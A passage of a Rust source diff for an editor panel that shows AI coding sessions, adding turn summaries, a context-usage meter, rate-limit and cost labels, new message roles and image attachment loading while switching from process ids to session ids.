+    fn is_video(&self) -> bool {
+        self.media_type
+            .as_ref()
+            .is_some_and(|media_type| media_type.starts_with("video/"))
+    }
 }
 
 #[derive(Clone, Debug, PartialEq)]
@@ -1011,6 +1222,12 @@ struct EntryCache {
     /// Keyed by entry key: the record's uuid, plus the block's index within the record.
     kinds: HashMap<SharedString, EntryKind>,
     attachments: HashMap<SharedString, AttachmentItem>,
+    /// Parsed `ToolUse` input, keyed by entry key, so a megabyte `Write` is not parsed
+    /// twice on every frame.
+    tool_inputs: HashMap<SharedString, Option<Value>>,
+    /// Record timestamps in milliseconds, keyed by entry key, for a turn summary's
+    /// duration when the turn wrote no footer.
+    timestamps: HashMap<SharedString, i64>,
     /// Counts the artifacts actually derived, so that a test can show a rebuild reused
     /// them rather than only showing that it produced the same result.
     #[cfg(test)]
@@ -1061,6 +1278,10 @@ impl EntryCache {
         Some(kind)
     }
 
+    fn get(&self, key: Option<&SharedString>) -> Option<EntryKind> {
+        key.and_then(|key| self.kinds.get(key).cloned())
+    }
+
     fn attachment(
         &mut self,
         key: Option<&SharedString>,
@@ -1088,6 +1309,10 @@ impl EntryCache {
             .retain(|key, _| !key_belongs_to_record(key, uuid));
         self.attachments
             .retain(|key, _| !key_belongs_to_record(key, uuid));
+        self.tool_inputs
+            .retain(|key, _| !key_belongs_to_record(key, uuid));
+        self.timestamps
+            .retain(|key, _| !key_belongs_to_record(key, uuid));
     }
 
     /// Forgets the records that have left the conversation being shown, so that the
@@ -1095,20 +1320,626 @@ impl EntryCache {
     fn retain_keys(&mut self, live_keys: &HashSet<SharedString>) {
         self.kinds.retain(|key, _| live_keys.contains(key));
         self.attachments.retain(|key, _| live_keys.contains(key));
+        self.tool_inputs.retain(|key, _| live_keys.contains(key));
+        self.timestamps.retain(|key, _| live_keys.contains(key));
+    }
+
+    fn parsed_tool_input(&mut self, key: &SharedString, input: &str) -> Option<&Value> {
+        if !self.tool_inputs.contains_key(key) {
+            self.tool_inputs
+                .insert(key.clone(), parse_tool_input(input));
+        }
+        self.tool_inputs.get(key).and_then(Option::as_ref)
+    }
+
+    fn remember_timestamp(&mut self, key: Option<&SharedString>, record: &TranscriptRecord) {
+        let Some(key) = key else {
+            return;
+        };
+        if let Some(milliseconds) = record
+            .raw
+            .get(TIMESTAMP_FIELD)
+            .and_then(Value::as_str)
+            .and_then(crate::timestamp_ms)
+        {
+            self.timestamps.insert(key.clone(), milliseconds);
+        }
     }
 }
 
 /// An entry key is a record's uuid on its own, or that uuid and the index of the block
 /// within the record.
+/// Every key that may address a cached artifact, including the attachment keys that
+/// live inside the single context entry rather than being entries themselves.
+fn live_cache_keys(entries: &[Entry]) -> HashSet<SharedString> {
+    let mut keys = HashSet::default();
+    for entry in entries {
+        keys.insert(entry.key.clone());
+        match &entry.kind {
+            // An output is clamped behind an expansion key of its own, which has to
+            // survive the rebuild that runs on every change to the transcript, or an
+            // output the reader has opened closes itself four times a second while
+            // the session is answering.
+            EntryKind::ToolResult { .. } => {
+                keys.insert(output_expansion_key(&entry.key));
+            }
+            // A CLI dispatch card reads the prompt file it was given, and both the read
+            // and its answer are addressed under a key of the call's own. Without it the
+            // rebuild that runs four times a second drops the `Task` and cancels the
+            // read, and the card waits on a load that will never arrive.
+            EntryKind::ToolUse { .. } => {
+                keys.insert(dispatch_prompt_key(&entry.key));
+                let report_key = dispatch_report_key(&entry.key);
+                keys.insert(output_expansion_key(&report_key));
+                keys.insert(report_key);
+            }
+            EntryKind::Attachments { items } => {
+                for item in items {
+                    keys.insert(item.key.clone());
+                    keys.insert(output_expansion_key(&item.key));
+                }
+            }
+            // Each sent file is fetched under a key of its own, which has to survive
+            // the rebuild that runs on every change to the transcript, or an image
+            // that has been fetched is fetched again four times a second while the
+            // session is answering.
+            EntryKind::SentFiles { files, .. } => {
+                for file_index in 0..files.len() {
+                    keys.insert(sent_file_key(&entry.key, file_index));
+                }
+            }
+            EntryKind::TurnSummary { .. } => {}
+            _ => {}
+        }
+    }
+    keys
+}
+
 fn key_belongs_to_record(key: &str, uuid: &str) -> bool {
     key.strip_prefix(uuid)
         .is_some_and(|rest| rest.is_empty() || rest.starts_with('#'))
 }
 
-#[derive(Clone, Copy, PartialEq)]
+fn turn_summary_key(turn_id: &SharedString) -> SharedString {
+    SharedString::from(format!("{turn_id}#summary"))
+}
+
+fn entry_starts_user_turn(kind: &EntryKind) -> bool {
+    matches!(
+        kind,
+        EntryKind::Message {
+            role: MessageRole::User,
+            ..
+        }
+    )
+}
+
+fn is_turn_detail(kind: &EntryKind) -> bool {
+    matches!(
+        kind,
+        EntryKind::ToolUse { .. }
+            | EntryKind::ToolResult { .. }
+            | EntryKind::Thinking { .. }
+            | EntryKind::TurnFooter { .. }
+    )
+}
+
+fn edited_file_path(name: &str, input: &str) -> Option<SharedString> {
+    if name != WRITE_TOOL_NAME && name != EDIT_TOOL_NAME && name != NOTEBOOK_EDIT_TOOL_NAME {
+        return None;
+    }
+    parse_tool_input(input)?
+        .get("file_path")
+        .and_then(Value::as_str)
+        .map(str::trim)
+        .filter(|path| !path.is_empty())
+        .map(|path| SharedString::from(path.to_string()))
+}
+
+fn collapse_turns(
+    entries: Vec<Entry>,
+    expanded: &HashSet<SharedString>,
+    expand_all: bool,
+    current_turn_running: bool,
+    agent_calls: &HashMap<SharedString, AgentCall>,
+    timestamps: &HashMap<SharedString, i64>,
+) -> Vec<Entry> {
+    if entries.is_empty() {
+        return entries;
+    }
+
+    let mut turn_starts = Vec::new();
+    for (index, entry) in entries.iter().enumerate() {
+        if entry_starts_user_turn(&entry.kind) {
+            turn_starts.push(index);
+        }
+    }
+    if turn_starts.is_empty() {
+        return entries;
+    }
+
+    let mut collapsed = Vec::with_capacity(entries.len());
+    collapsed.extend(entries[..turn_starts[0]].iter().cloned());
+
+    for (turn_index, start) in turn_starts.iter().copied().enumerate() {
+        let end = turn_starts
+            .get(turn_index.saturating_add(1))
+            .copied()
+            .unwrap_or(entries.len());
+        let is_current_running =
+            current_turn_running && turn_index.saturating_add(1) == turn_starts.len();
+        collapsed.extend(collapse_one_turn(
+            &entries[start..end],
+            expanded,
+            expand_all,
+            is_current_running,
+            agent_calls,
+            timestamps,
+        ));
+    }
+    collapsed
+}
+
+fn collapse_one_turn(
+    turn: &[Entry],
+    expanded: &HashSet<SharedString>,
+    expand_all: bool,
+    is_current_running: bool,
+    agent_calls: &HashMap<SharedString, AgentCall>,
+    timestamps: &HashMap<SharedString, i64>,
+) -> Vec<Entry> {
+    let Some(first) = turn.first() else {
+        return Vec::new();
+    };
+    if !entry_starts_user_turn(&first.kind) {
+        return turn.to_vec();
+    }
+    let turn_id = first.key.clone();
+
+    let mut calls = 0usize;
+    let mut files_edited = Vec::new();
+    let mut seen_files = HashSet::default();
+    let mut thinking_blocks = 0usize;
+    let mut duration_ms = None;
+    let mut pending_background_agents = 0u64;
+    let mut agents = 0usize;
+    let mut first_detail = None;
+    let mut first_timestamp = None;
+    let mut last_timestamp = None;
+
+    for (offset, entry) in turn.iter().enumerate() {
+        if let Some(timestamp) = timestamps.get(&entry.key).copied() {
+            if first_timestamp.is_none() {
+                first_timestamp = Some(timestamp);
+            }
+            last_timestamp = Some(timestamp);
+        }
+        if is_turn_detail(&entry.kind) && first_detail.is_none() {
+            first_detail = Some(offset);
+        }
+        match &entry.kind {
+            EntryKind::ToolUse { name, input, .. } => {
+                calls = calls.saturating_add(1);
+                if agent_calls.contains_key(&entry.key) {
+                    agents = agents.saturating_add(1);
+                }
+                if let Some(path) = edited_file_path(name, input)
+                    && seen_files.insert(path.clone())
+                {
+                    files_edited.push(path);
+                }
+            }
+            EntryKind::Thinking { .. } => {
+                thinking_blocks = thinking_blocks.saturating_add(1);
+            }
+            EntryKind::TurnFooter {
+                duration_ms: footer_duration,
+                pending_background_agents: pending,
+                ..
+            } => {
+                duration_ms = Some(*footer_duration);
+                pending_background_agents = *pending;
+            }
+            _ => {}
+        }
+    }
+
+    if duration_ms.is_none()
+        && let (Some(first_timestamp), Some(last_timestamp)) = (first_timestamp, last_timestamp)
+    {
+        duration_ms = Some(last_timestamp.saturating_sub(first_timestamp).max(0) as u64);
+    }
+
+    // A turn with no tool calls has nothing to summarise; thinking and the footer stay
+    // in place. The current running turn streams its tools, so it is never collapsed.
+    if calls == 0 || is_current_running {
+        return turn.to_vec();
+    }
+
+    let is_expanded = expand_all || expanded.contains(&turn_id);
+    let summary = Entry {
+        key: turn_summary_key(&turn_id),
+        kind: EntryKind::TurnSummary {
+            turn_id,
+            calls,
+            files_edited,
+            agents,
+            thinking_blocks,
+            duration_ms,
+            pending_background_agents,
+            is_expanded,
+        },
+    };
+
+    if is_expanded {
+        let insert_at = first_detail.unwrap_or(turn.len());
+        let mut expanded_turn = Vec::with_capacity(turn.len().saturating_add(1));
+        expanded_turn.extend(turn[..insert_at].iter().cloned());
+        expanded_turn.push(summary);
+        expanded_turn.extend(turn[insert_at..].iter().cloned());
+        expanded_turn
+    } else {
+        let mut collapsed = Vec::new();
+        let mut pushed_summary = false;
+        for entry in turn {
+            if is_turn_detail(&entry.kind) {
+                if !pushed_summary {
+                    collapsed.push(summary.clone());
+                    pushed_summary = true;
+                }
+            } else {
+                collapsed.push(entry.clone());
+            }
+        }
+        if !pushed_summary {
+            collapsed.push(summary);
+        }
+        collapsed
+    }
+}
+
+fn format_turn_summary_line(
+    calls: usize,
+    files_edited: usize,
+    agents: usize,
+    duration_ms: Option<u64>,
+    is_expanded: bool,
+) -> String {
+    let glyph = if is_expanded { "▾" } else { "▸" };
+    let mut parts = Vec::new();
+    if calls > 0 {
+        parts.push(if calls == 1 {
+            "1 tool call".to_string()
+        } else {
+            format!("{calls} tool calls")
+        });
+    }
+    if files_edited > 0 {
+        parts.push(if files_edited == 1 {
+            "1 file edited".to_string()
+        } else {
+            format!("{files_edited} files edited")
+        });
+    }
+    if agents > 0 {
+        parts.push(if agents == 1 {
+            "1 agent".to_string()
+        } else {
+            format!("{agents} agents")
+        });
+    }
+    if let Some(duration_ms) = duration_ms {
+        parts.push(format_duration_seconds(duration_ms));
+    }
+    if parts.is_empty() {
+        format!("{glyph} turn")
+    } else {
+        format!("{glyph} {}", parts.join(" · "))
+    }
+}
+
+fn format_duration_seconds(duration_ms: u64) -> String {
+    let total_seconds = duration_ms / 1000;
+    if total_seconds < 60 {
+        format!("{total_seconds}s")
+    } else {
+        format!("{}:{:02}", total_seconds / 60, total_seconds % 60)
+    }
+}
+
+#[derive(Clone, Debug, PartialEq)]
+enum NowRow {
+    Tool {
+        tool_use_id: String,
+        name: SharedString,
+        target: SharedString,
+        started_at_ms: Option<i64>,
+        input: Value,
+    },
+    Thinking {
+        since_ms: Option<i64>,
+    },
+}
+
+fn now_row(live: &LiveState, activity: &Activity) -> Option<NowRow> {
+    if live.last_event_at_ms == 0 {
+        return match activity {
+            Activity::RunningTool { name, target } => Some(NowRow::Tool {
+                tool_use_id: String::new(),
+                name: name.clone(),
+                target: target.clone(),
+                started_at_ms: None,
+                input: Value::Null,
+            }),
+            Activity::Thinking => Some(NowRow::Thinking { since_ms: None }),
+            Activity::Idle => None,
+        };
+    }
+
+    if let Some(tool) = live.running_tools.last() {
+        return Some(now_row_from_running_tool(tool));
+    }
+    match live.turn {
+        Turn::Running { since_ms } => Some(NowRow::Thinking {
+            since_ms: Some(since_ms),
+        }),
+        Turn::Idle => None,
+    }
+}
+
+fn now_row_from_running_tool(tool: &RunningTool) -> NowRow {
+    NowRow::Tool {
+        tool_use_id: tool.tool_use_id.clone(),
+        name: SharedString::from(tool.name.clone()),
+        target: tool_target_from_input(Some(&tool.input)),
+        started_at_ms: Some(tool.started_at_ms),
+        input: tool.input.clone(),
+    }
+}
+
+fn format_elapsed_mm_ss(elapsed_ms: i64) -> String {
+    let total_seconds = (elapsed_ms.max(0) / 1000).min(ELAPSED_DISPLAY_CAP_SECONDS);
+    format!("{}:{:02}", total_seconds / 60, total_seconds % 60)
+}
+
+/// True after Stop has already written an interrupt outbox file, until the 5s
+/// "interrupt sent" window ends. The channel server also throttles SIGINT at 3s;
+/// without this a double-click queues a second file while the turn is still Running.
+fn interrupt_is_awaiting_result(sent_at_ms: Option<i64>, now_ms: i64) -> bool {
+    sent_at_ms.is_some_and(|sent_at_ms| now_ms.saturating_sub(sent_at_ms) < INTERRUPT_SENT_MS)
+}
+
+fn live_message_is_visible(live: &LiveState, now_ms: i64) -> bool {
+    let Some(message) = live.live_message.as_ref() else {
+        return false;
+    };
+    if message.text.trim().is_empty() {
+        return false;
+    }
+    let stale = now_ms.saturating_sub(message.updated_at_ms) > LIVE_MESSAGE_STALE_MS;
+    !(stale && matches!(live.turn, Turn::Idle))
+}
+
+fn live_message_markdown_key(message_id: Option<&str>) -> SharedString {
+    SharedString::from(format!("live:{}", message_id.unwrap_or("pending")))
+}
+
+fn clamp_live_message_height(requested: Pixels, rem_size: Pixels, panel_height: Pixels) -> Pixels {
+    let min_height = rem_size * LIVE_MESSAGE_MIN_HEIGHT_REMS;
+    let max_height = (panel_height * LIVE_MESSAGE_HEIGHT_PANEL_FRACTION).max(min_height);
+    requested.max(min_height).min(max_height)
+}
+
+#[derive(Clone, Debug, PartialEq)]
+struct ContextMeter {
+    fill: Option<f32>,
+    label: SharedString,
+    color: Color,
+    tooltip: Option<String>,
+}
+
+fn context_meter_color(percentage: f64) -> Color {
+    if percentage < 60. {
+        Color::Muted
+    } else if percentage <= 85. {
+        Color::Warning
+    } else {
+        Color::Error
+    }
+}
+
+fn context_meter(
+    status: Option<&StatusSnapshot>,
+    spend: &Spend,
+    compacting: bool,
+) -> Option<ContextMeter> {
+    let context_tokens = spend.context_tokens;
+    let window = status.and_then(|status| status.context_window_size);
+    let used_percentage = status
+        .and_then(|status| status.context_used_percentage)
+        .or_else(|| {
+            window
+                .filter(|window| *window > 0)
+                .map(|window| (context_tokens as f64) * 100. / (window as f64))
+        })
+        .map(|percentage| percentage.clamp(0., 100.));
+
+    if context_tokens == 0 && used_percentage.is_none() && window.is_none() {
+        return None;
+    }
+
+    let fill = used_percentage.map(|percentage| (percentage / 100.) as f32);
+    let label = match (context_tokens, window, used_percentage) {
+        (tokens, Some(window), Some(percentage)) if tokens > 0 => SharedString::from(format!(
+            "{} / {} · {:.0}%",
+            compact_token_count(tokens),
+            compact_token_count(window),
+            percentage
+        )),
+        (tokens, Some(window), None) if tokens > 0 => SharedString::from(format!(
+            "{} / {}",
+            compact_token_count(tokens),
+            compact_token_count(window)
+        )),
+        (tokens, None, Some(percentage)) if tokens > 0 => SharedString::from(format!(
+            "{} · {:.0}%",
+            compact_token_count(tokens),
+            percentage
+        )),
+        (0, _, Some(percentage)) => SharedString::from(format!("{percentage:.0}%")),
+        (tokens, _, _) if tokens > 0 => {
+            SharedString::from(format!("{} ctx", compact_token_count(tokens)))
+        }
+        _ => return None,
+    };
+
+    let color = used_percentage
+        .map(context_meter_color)
+        .unwrap_or(Color::Muted);
+
+    let mut tooltip_parts = Vec::new();
+    if spend.context_is_post_compaction {
+        tooltip_parts.push(
+            "(compacted) Context after compaction counts the kept conversation alone. The next answer is larger once tools and skills are re-sent.".to_string(),
+        );
+    }
+    if compacting {
+        tooltip_parts.push("compacting…".to_string());
+    }
+
+    Some(ContextMeter {
+        fill,
+        label,
+        color,
+        tooltip: (!tooltip_parts.is_empty()).then_some(tooltip_parts.join("\n")),
+    })
+}
+
+fn tokens_left_quantity(tokens: u64) -> String {
+    if tokens >= 1_000_000 {
+        format!("{:.1}M", tokens as f64 / 1_000_000.)
+    } else if tokens >= 1_000 {
+        if tokens.is_multiple_of(1_000) {
+            format!("{}K", tokens / 1_000)
+        } else {
+            format!("{:.1}K", tokens as f64 / 1_000.)
+        }
+    } else {
+        format!("{tokens}")
+    }
+}
+
+fn tokens_left_fact(tokens_left: u64) -> SharedString {
+    SharedString::from(format!("{} tokens left", tokens_left_quantity(tokens_left)))
+}
+
+fn rate_limit_fact(five_hour: Option<f64>, seven_day: Option<f64>) -> Option<SharedString> {
+    match (five_hour, seven_day) {
+        (Some(five), Some(seven)) => Some(SharedString::from(format!(
+            "5h {five:.0}% · 7d {seven:.0}%"
+        ))),
+        (Some(five), None) => Some(SharedString::from(format!("5h {five:.0}%"))),
+        (None, Some(seven)) => Some(SharedString::from(format!("7d {seven:.0}%"))),
+        (None, None) => None,
+    }
+}
+
+fn format_resets_at(resets_at: i64) -> Option<String> {
+    if resets_at <= 0 {
+        return None;
+    }
+    chrono::DateTime::from_timestamp(resets_at, 0).map(|time| {
+        time.with_timezone(&chrono::Local)
+            .format("%Y-%m-%d %H:%M")
+            .to_string()
+    })
+}
+
+fn panel_is_narrow(window: &Window) -> bool {
+    window.bounds().size.width < px(NARROW_PANEL_WIDTH_PIXELS)
+}
+
+/// The command line the Attach button opens a terminal on, or `None` when the id the
+/// agents listing gave is not one a shell may be handed.
+///
+/// The terminal takes a command line rather than a program and its arguments, so an id
+/// able to close the word it sits in would be a second command — chosen, on a remote
+/// project, by the far end — running on this machine. The neighbouring tmux button quotes
+/// its target for the same reason.
+fn attach_command(agent_id: &str) -> Option<String> {
+    let agent_id = crate::session_registry::claude_command_operand(agent_id)?;
+    Some(format!("claude attach {agent_id}"))
+}
+
+fn claude_ai_session_url(bridge_session_id: Option<&str>) -> Option<String> {
+    let id = bridge_session_id
+        .map(str::trim)
+        .filter(|id| !id.is_empty())?;
+    let url = format!("{BRIDGE_URL_PREFIX}code/{id}");
+    bridge_url(&url).map(|url| url.to_string())
+}
+
+fn toolbar_model(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
+    status
+        .and_then(|status| status.model_display_name.as_deref())
+        .map(str::trim)
+        .filter(|name| !name.is_empty())
+        .map(|name| SharedString::from(name.to_string()))
+        .or_else(|| spend.model.clone())
+}
+
+fn toolbar_effort(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
+    status
+        .and_then(|status| status.effort.as_deref())
+        .map(str::trim)
+        .filter(|effort| !effort.is_empty())
+        .map(|effort| SharedString::from(effort.to_string()))
+        .or_else(|| spend.effort.clone())
+}
+
+fn toolbar_cost(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
+    status
+        .and_then(|status| status.total_cost_usd)
+        .map(|total| SharedString::from(format_usd(total)))
+        .or_else(|| session_cost(spend))
+}
+
+fn format_status_line(
+    turn: &Turn,
+    permission_mode: Option<&str>,
+    channel_live: bool,
+    now_ms: i64,
+) -> String {
+    let turn_part = match turn {
+        Turn::Idle => "● idle".to_string(),
+        Turn::Running { since_ms } => {
+            format!(
+                "● running {}",
+                format_elapsed_mm_ss(now_ms.saturating_sub(*since_ms))
+            )
+        }
+    };
+    let mode = permission_mode
+        .map(str::trim)
+        .filter(|mode| !mode.is_empty())
+        .unwrap_or("unknown");
+    let channel_part = if channel_live {
+        "channel: connected"
+    } else {
+        "channel: not loaded — Setup"
+    };
+    format!("{turn_part} · mode: {mode} · {channel_part}")
+}
+
+#[derive(Clone, Debug, PartialEq)]
 enum MessageRole {
     User,
     Assistant,
+    /// Another session or a subagent, never styled as the reader.
+    Peer {
+        from: Option<SharedString>,
+    },
+    System,
     Other,
     /// The record compaction writes in the user's place, which carries `"type":"user"`
     /// but was not typed by the user.
@@ -1164,6 +1995,14 @@ enum OutputLoad {
     Failed(SharedString),
 }
 
+/// A sent image being fetched from the machine the session runs on.
+#[derive(Clone)]
+enum AttachmentLoad {
+    Loading,
+    Loaded(Arc<Image>),
+    Failed(SharedString),
+}
+
 impl MessageRole {
     fn from_record_type(record_type: &str) -> Self {
         match record_type {
@@ -1173,19 +2012,30 @@ impl MessageRole {
         }
     }
 
-    fn label(self) -> &'static str {
+    fn label(&self) -> SharedString {
         match self {
-            Self::User => "You",
-            Self::Assistant => "Claude",
-            Self::Other => "Message",
-            Self::CompactSummary => "Summary",
+            Self::User => SharedString::from("You"),
+            Self::Assistant => SharedString::from("Claude"),
+            Self::Peer { from } => match from
+                .as_ref()
+                .map(|from| from.trim())
+                .filter(|from| !from.is_empty())
+            {
+                Some(from) => SharedString::from(format!("Message from {from}")),
+                None => SharedString::from("Message from another session"),
+            },
+            Self::System => SharedString::from("System"),
+            Self::Other => SharedString::from("Message"),
+            Self::CompactSummary => SharedString::from("Summary"),
         }
     }
 
-    fn icon(self) -> IconName {
+    fn icon(&self) -> IconName {
         match self {
             Self::User => IconName::Person,
             Self::Assistant => IconName::AiClaude,
+            Self::Peer { .. } => IconName::Chat,
+            Self::System => IconName::Info,
             Self::Other => IconName::Chat,
             Self::CompactSummary => IconName::Compact,
         }
@@ -1193,12 +2043,14 @@ impl MessageRole {
 
     /// Each speaker keeps a color of its own, because the panel is often narrow enough
     /// that a label is truncated and the color is what is left to tell the rows apart.
-    fn color(self) -> Color {
+    fn color(&self) -> Color {
         match self {
             // Read apart from the assistant's at a glance: both were blues, and the rail
             // beside a message is the only thing that says whose it is.
             Self::User => Color::Error,
             Self::Assistant => Color::Accent,
+            Self::Peer { .. } => Color::Muted,
+            Self::System => Color::Muted,
             Self::Other => Color::Muted,
             Self::CompactSummary => Color::Warning,
         }
@@ -1265,14 +2117,14 @@ impl ClaudeSessionsPanel {
         let Some(panel) = workspace.panel::<Self>(cx) else {
             return;
         };
-        let (fs, source, project_root, process_id, seed, target) = {
+        let (fs, source, project_root, session_id, seed, target) = {
             let panel = panel.read(cx);
             let store = panel.store.read(cx);
             (
                 panel.fs.clone(),
                 panel.source.clone(),
                 panel.project_root.clone(),
-                store.selected(),
+                store.selected().map(str::to_string),
                 // What this store already knows about the session being opened, so that
                 // the tab is not blocked on a scan of its own to learn it again.
                 store.session_seed(),
@@ -1286,7 +2138,7 @@ impl ClaudeSessionsPanel {
             fs,
             source,
             project_root,
-            process_id,
+            session_id,
             seed,
             target,
             window,
@@ -1310,7 +2162,7 @@ impl ClaudeSessionsPanel {
     /// so this crashed for every way into an agent offered from a tab.
     fn reveal_in_pane(
         &mut self,
-        process_id: Option<u32>,
+        session_id: Option<String>,
         target: TranscriptTarget,
         window: &mut Window,
         cx: &mut Context<Self>,
@@ -1329,7 +2181,7 @@ impl ClaudeSessionsPanel {
                     fs,
                     source,
                     project_root,
-                    process_id,
+                    session_id,
                     seed,
                     target,
                     window,
@@ -1347,8 +2199,8 @@ impl ClaudeSessionsPanel {
         window: &mut Window,
         cx: &mut Context<Self>,
     ) {
-        let process_id = self.store.read(cx).selected();
-        self.reveal_in_pane(process_id, target, window, cx);
+        let session_id = self.store.read(cx).selected().map(str::to_string);
+        self.reveal_in_pane(session_id, target, window, cx);
     }
 
     /// One tab per session, identified by the process it is reading.
@@ -1367,7 +2219,7 @@ impl ClaudeSessionsPanel {
         fs: Arc<dyn Fs>,
         source: Arc<dyn SessionSource>,
         project_root: Option<PathBuf>,
-        process_id: Option<u32>,
+        session_id: Option<String>,
         seed: Option<(RegisteredSession, Option<PathBuf>)>,
         target: TranscriptTarget,
         window: &mut Window,
@@ -1381,7 +2233,7 @@ impl ClaudeSessionsPanel {
         // other.
         let existing = workspace.items_of_type::<Self>(cx).find(|item| {
             let store = item.read(cx).store.read(cx);
-            store.selected() == process_id && *store.transcript_target() == target
+            store.selected() == session_id.as_deref() && *store.transcript_target() == target
         });
         if let Some(existing) = existing {
             workspace.activate_item(&existing, true, true, window, cx);
@@ -1392,15 +2244,15 @@ impl ClaudeSessionsPanel {
         let item = cx.new(|cx| {
             let store = cx.new(|cx| {
                 let mut store = ClaudeSessionStore::new(source.clone(), project_root.clone(), cx);
-                // Before selecting, which is what turns a process id into the
-                // conversation being followed: a tab handed only a process id has nothing
+                // Before selecting, which is what turns a session id into the
+                // conversation being followed: a tab handed only a session id has nothing
                 // to follow until a scan of its own lands, and draws "no transcript yet"
                 // over the conversation it was opened to read until one does.
                 if let Some((session, transcript_path)) = seed {
                     store.seed_session(session, transcript_path, cx);
                 }
-                if let Some(process_id) = process_id {
-                    store.select(process_id, cx);
+                if let Some(session_id) = session_id {
+                    store.select(session_id, cx);
                 }
                 // After selecting, which follows the session's own conversation.
                 if target != TranscriptTarget::Main {
@@ -1457,9 +2309,7 @@ impl ClaudeSessionsPanel {
         // the commands menu it cannot be answered from what is already here: the ask has
         // to be made when the box changes rather than when it is drawn.
         let editor_subscription = cx.subscribe(&message_editor, |this, _, event, cx| {
-            if matches!(event, EditorEvent::BufferEdited) {
-                this.list_files_for_mention(cx);
-            }
+            this.handle_message_editor_event(event, cx);
         });
 
         let mut this = Self {
@@ -1471,32 +2321,41 @@ impl ClaudeSessionsPanel {
             message_editor,
             project_root,
             in_pane: false,
-            pane_expanded: false,
-            terminal: None,
-            terminal_process_id: None,
-            terminal_height: DEFAULT_TERMINAL_HEIGHT,
             input_expanded: true,
             history_index: None,
-            quit_armed: false,
-            ticked: None,
-            typing_answer_for: None,
+            question_ticks: HashSet::default(),
+            ticked_question: None,
+            permission_answered: false,
+            permission_answered_for: None,
+            slash_send_note: None,
             opened_input_for_question: None,
             live_message_scroll: ScrollHandle::new(),
             live_message_length: 0,
+            live_message_markdown_key: None,
+            live_message_identity: None,
+            live_message_height: rems(LIVE_MESSAGE_MAX_HEIGHT_REMS).to_pixels(window.rem_size()),
+            live_message_drag: None,
+            now_row_expanded: false,
+            interrupt_sent_at_ms: None,
+            stop_armed_until_ms: None,
+            lifecycle_note: None,
+            _lifecycle_command: Task::ready(()),
             file_matches: Vec::new(),
             file_matches_for: None,
+            file_query: None,
             file_highlight: 0,
             dismissed_file_menu_for: None,
             _listing_files: Task::ready(()),
             _pasting: Task::ready(()),
+            paste_error: None,
             slash_highlight: 0,
             dismissed_slash_menu_for: None,
             slash_commands: Vec::new(),
+            slash_commands_for: None,
+            slash_commands_fresh: false,
             _listing_slash_commands: Task::ready(()),
-            _answering: Task::ready(()),
             hook_install_note: None,
             _installing_hook: Task::ready(()),
-            _terminal_attach: Task::ready(()),
             entries: Vec::new(),
             pending_sends: PendingSends::default(),
             activity: Activity::Idle,
@@ -1517,6 +2376,11 @@ impl ClaudeSessionsPanel {
             overwrites_dropped: 0,
             loaded_outputs: HashMap::default(),
             output_loads: HashMap::default(),
+            loaded_attachments: HashMap::default(),
+            forced_attachment_loads: HashSet::default(),
+            dispatch_prompts: HashMap::default(),
+            patched_calls: HashSet::default(),
+            attachment_loads: HashMap::default(),
             _store_subscription: store_subscription,
             _editor_subscription: editor_subscription,
         };
@@ -1526,10 +2390,22 @@ impl ClaudeSessionsPanel {
         this
     }
 
-    fn select_session(&mut self, process_id: u32, cx: &mut Context<Self>) {
+    fn handle_message_editor_event(&mut self, event: &EditorEvent, cx: &mut Context<Self>) {
+        match event {
+            EditorEvent::BufferEdited => {
+                self.paste_error = None;
+                self.list_files_for_mention(cx);
+            }
+            EditorEvent::Focused | EditorEvent::FocusedIn => self.load_slash_commands(cx),
+            _ => {}
+        }
+    }
+
+    fn select_session(&mut self, session_id: String, cx: &mut Context<Self>) {
         self.show_the_newest_of_another_conversation();
         self.store
-            .update(cx, |store, cx| store.select(process_id, cx));
+            .update(cx, |store, cx| store.select(session_id, cx));
+        self.load_slash_commands(cx);
     }
 
     /// What is owed to a reader who has been moved to another conversation, whichever
@@ -1545,139 +2421,29 @@ impl ClaudeSessionsPanel {
         // Both are about the session being left: a place in its history, and a quit
         // aimed at it. Neither means anything against the one arrived at.
         self.history_index = None;
-        self.quit_armed = false;
-        self.ticked = None;
-        self.typing_answer_for = None;
-        self._answering = Task::ready(());
+        self.question_ticks.clear();
+        self.ticked_question = None;
+        self.permission_answered = false;
+        self.permission_answered_for = None;
+        self.slash_send_note = None;
+        self.file_matches.clear();
+        self.file_matches_for = None;
+        self.file_query = None;
+        self.file_highlight = 0;
+        self.dismissed_file_menu_for = None;
+        self._listing_files = Task::ready(());
+        self.dismissed_slash_menu_for = None;
+        self.slash_highlight = 0;
+        self.slash_commands.clear();
+        self.slash_commands_for = None;
+        self.slash_commands_fresh = false;
     }
 
-    /// Attaches a terminal to the selected session's pane, so that the CLI can be typed
-    /// into and scrolled the way it would be in any other terminal.
-    ///
-    /// The transcript above stays the way the conversation is read — it is built for
-    /// that, and a terminal only ever shows the last screenful. This is for the parts
-    /// the transcript does not have: a prompt waiting to be answered, the messages
-    /// queued behind the running turn, the status line.
-    ///
-    /// Nothing is attached until the terminal is on screen, and what is attached is
-    /// dropped when the reader selects another session: a session's pane is one
-    /// terminal, and attaching to one a reader has left would leave a client on it for
-    /// as long as the panel lived.
-    fn sync_terminal(&mut self, window: &mut Window, cx: &mut Context<Self>) {
-        let selected = self.store.read(cx).selected();
-        let wanted = self
-            .pane_expanded
-            .then_some(selected)
-            .flatten()
-            .filter(|_| self.store.read(cx).pane_target().is_some());
-
-        if wanted == self.terminal_process_id {
-            return;
-        }
-
-        self.terminal_process_id = wanted;
-        self.terminal = None;
-        self._terminal_attach = Task::ready(());
-
-        let Some(process_id) = wanted else {
-            cx.notify();
+    fn copy_setup_commands(&self, cx: &mut Context<Self>) {
+        let Some(home) = self.store.read(cx).home_directory() else {
             return;
         };
-        let Some(arguments) = self.store.read(cx).attach_arguments() else {
-            cx.notify();
-            return;
-        };
-        let Some(workspace) = self.workspace.upgrade() else {
-            return;
-        };
-        let project = workspace.read(cx).project().clone();
-
-        // `command` is spawned as a program with `args`, never through a shell, so the
-        // two are kept apart here: a whole command line in `command` is looked up as one
-        // file name and never found. It also means every target reaches tmux as its own
-        // argument, with no quoting to get right.
-        let label = format!("tmux {}", arguments.join(" "));
-        let spawn = SpawnInTerminal {
-            id: TaskId(format!("claude-session-attach-{process_id}")),
-            full_label: label.clone(),
-            label: label.clone(),
-            command: Some("tmux".to_string()),
-            args: arguments,
-            command_label: label,
-            use_new_terminal: true,
-            allow_concurrent_runs: true,
